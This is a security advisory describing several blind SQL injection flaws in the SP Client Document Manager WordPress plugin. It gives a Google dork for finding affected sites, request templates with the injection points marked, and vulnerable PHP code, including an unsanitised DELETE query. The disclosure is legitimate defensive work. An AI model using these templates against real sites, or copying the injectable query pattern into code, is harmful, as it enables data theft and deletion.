@@ -1,0 +1,139 @@
+Vulnerability title: Multi SQL Injection in SP Client Document Manager plugin
+CVE: N/A
+Vendor: http://smartypantsplugins.com
+Plugin: SP Client Document Manager
+Download link: https://wordpress.org/plugins/sp-client-document-manager/
+Affected version: version 2.4.1 and previous version
+Google dork: inurl:wp-content/plugins/sp-client-document-manager
+Fixed version: N/A
+Reported by: Dang Quoc Thai - thai.q.dang@itas.vn - Credits to ITAS Team - www.itas.vn
+Timeline: 	+ 10/30/2014: Notify to vendor - vendor does not response
+			+ 11/08/2014: Notify to vendor - Vendor blocks IPs from Viet Nam
+			+ 11/05/2014: Notify to vendor - vendor does not response
+			+ 11/20/2014: Public information
+
+
+Details:
+
+The Blind SQL injection vulnerability has been found and confirmed within the software as an anonymous user. A successful attack could allow an anonymous attacker to access information such as username and password hashes that are stored in the database. The following URL and parameter has been confirmed to suffer from blind SQL injection: 
+
+Link 1:
+
+POST /wordpress/wp-content/plugins/sp-client-document-manager/ajax.php?function=email-vendor HTTP/1.1
+Host: server
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://server/wordpress/?page_id=16
+Cookie: wordpress_cbbb3ecca6306be6e41d05424d417f7b=test1%7C1414550777%7CxKIQf1812x9lfyhuFgNQQhmDtojDdEnDTfLisVHwnJ6%7Cc493b6c21a4a1916e2bc6076600939af5276b6feb09d06ecc043c37bd92a0748; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_cbbb3ecca6306be6e41d05424d417f7b=test1%7C1414550777%7CxKIQf1812x9lfyhuFgNQQhmDtojDdEnDTfLisVHwnJ6%7C7995fe13b1bbe0761cb05258e4e13b20b27cc9cedf3bc337440672353309e8a3; bp-activity-oldestpage=1
+Connection: keep-alive
+Content-Length: 33
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+vendor_email[]=<SQL Injection>
+
+
+Vulnerable file:/wp-content/plugins/sp-client-document-manager/classes/ajax.php
+Vulnerable code: (Line: 1516 -> 1530)
+    function email_vendor()
+    {
+        global $wpdb, $current_user;
+        if (count($_POST['vendor_email']) == 0) {
+            echo '<p style="color:red;font-weight:bold">' . __("Please select at least one file!", "sp-cdm") . '</p>';
+        } else {
+            $files = implode(",", $_POST['vendor_email']);
+            echo "SELECT *  FROM " . $wpdb->prefix . "sp_cu  WHERE id IN (" . $files . ")"."\n";
+            $r     = $wpdb->get_results("SELECT *  FROM " . $wpdb->prefix . "sp_cu  WHERE id IN (" . $files . ")", ARRAY_A);
+
+
+
+Link 2: http://server/wordpress/wp-content/plugins/sp-client-document-manager/ajax.php?function=download-project&id=<SQL Injection>
+
+GET /wp-content/plugins/sp-client-document-manager/ajax.php?function=download-project&id=<SQL Injection> HTTP/1.1
+Host: server
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=4f7eca4e8ea50fadba7209e47494f29c
+Connection: keep-alive
+
+Vulnerable file:/wp-content/plugins/sp-client-document-manager/classes/ajax.php
+Vulnerable code: (Line: 1462 -> 1479)
+
+function download_project()
+    {
+        global $wpdb, $current_user;
+        $user_ID     = $_GET['id'];
+        $r           = $wpdb->get_results("SELECT *  FROM " . $wpdb->prefix . "sp_cu   where pid = $user_ID  order by date desc", ARRAY_A);
+        $r_project   = $wpdb->get_results("SELECT *  FROM " . $wpdb->prefix . "sp_cu_project where id = $user_ID  ", ARRAY_A);
+        $return_file = "" . preg_replace('/[^\w\d_ -]/si', '', stripslashes($r_project[0]['name'])) . ".zip";
+        $zip         = new Zip();
+        $dir         = '' . SP_CDM_UPLOADS_DIR . '' . $r_project[0]['uid'] . '/';
+        $path        = '' . SP_CDM_UPLOADS_DIR_URL . '' . $r_project[0]['uid'] . '/';
+        //@unlink($dir.$return_file);
+        for ($i = 0; $i < count($r); $i++) {
+            $zip->addFile(file_get_contents($dir . $r[$i]['file']), $r[$i]['file'], filectime($dir . $r[$i]['file']));
+        }
+        $zip->finalize(); // as we are not using getZipData or getZipFile, we need to call finalize ourselves.
+        $zip->setZipFile($dir . $return_file);
+        header("Location: " . $path . $return_file . "");
+    }
+
+Link 3: http://server/wordpress/wp-content/plugins/sp-client-document-manager/ajax.php?function=download-archive&id=<SQL Injection>
+
+GET /wp-content/plugins/sp-client-document-manager/ajax.php?function=download-archive&id=<SQL Injection> HTTP/1.1
+Host: server
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=4f7eca4e8ea50fadba7209e47494f29c
+Connection: keep-alive
+Vulnerable file:/wp-content/plugins/sp-client-document-manager/classes/ajax.php
+Vulnerable code: (Line: 1480 -> 1496)
+
+
+function download_archive()
+    {
+        global $wpdb, $current_user;
+        $user_ID     = $_GET['id'];
+        $dir         = '' . SP_CDM_UPLOADS_DIR . '' . $user_ID . '/';
+        $path        = '' . SP_CDM_UPLOADS_DIR_URL . '' . $user_ID . '/';
+        $return_file = "Account.zip";
+        $zip         = new Zip();
+        $r           = $wpdb->get_results("SELECT *  FROM " . $wpdb->prefix . "sp_cu   where uid = $user_ID  order by date desc", ARRAY_A);
+        //@unlink($dir.$return_file);
+        for ($i = 0; $i < count($r); $i++) {
+            $zip->addFile(file_get_contents($dir . $r[$i]['file']), $r[$i]['file'], filectime($dir . $r[$i]['file']));
+        }
+        $zip->finalize(); // as we are not using getZipData or getZipFile, we need to call finalize ourselves.
+        $zip->setZipFile($dir . $return_file);
+        header("Location: " . $path . $return_file . "");
+    }
+ 
+Link 4: http://server/wordpress/wp-content/plugins/sp-client-document-manager/ajax.php?function=remove-category&id=<SQL Injection>
+
+GET /wp-content/plugins/sp-client-document-manager/ajax.php?function=remove-category&id=<SQL Injection> HTTP/1.1
+Host: server
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=4f7eca4e8ea50fadba7209e47494f29c
+Connection: keep-alive
+Vulnerable file:/wp-content/plugins/sp-client-document-manager/classes/ajax.php
+Vulnerable code: (Line: 1480 -> 1496)
+
+Vulnerable file:/wp-content/plugins/sp-client-document-manager/classes/ajax.php
+Vulnerable code: (Line: 368 -> 372)
+
+    function remove_cat()
+    {
+        global $wpdb, $current_user;
+        $wpdb->query("DELETE FROM " . $wpdb->prefix . "sp_cu_project WHERE id = " . $_REQUEST['id'] . "	");
+        $wpdb->query("DELETE FROM " . $wpdb->prefix . "sp_cu WHERE pid = " . $_REQUEST['id'] . "	");
+}  
+
